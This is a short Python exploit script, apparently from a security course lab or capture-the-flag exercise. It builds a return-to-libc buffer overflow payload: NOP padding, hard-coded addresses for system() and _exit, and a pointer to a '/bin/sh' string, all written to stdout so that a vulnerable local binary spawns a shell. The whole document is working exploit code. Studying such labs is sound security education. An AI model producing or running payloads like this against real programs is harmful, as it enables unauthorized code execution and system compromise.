import sys
from struct import pack
from shellcode import shellcode
# vulnerable ret_address: 0xfff6ed3c
# buffer address: 0xfff6ed26
# subtracted the two to get padding length
padding = b'\x90' * 22
sys_address = pack("<I", 0x08051950)
# _exit address found via objdump
sys_return_address = pack("<I", 0x0807a064)
# ebp address found at system call
bin_sh_address = pack("<I", 0xfff6ed48)
bin_sh = b"/bin/sh"

sys.stdout.buffer.write(padding + sys_address + sys_return_address +  bin_sh_address + bin_sh)
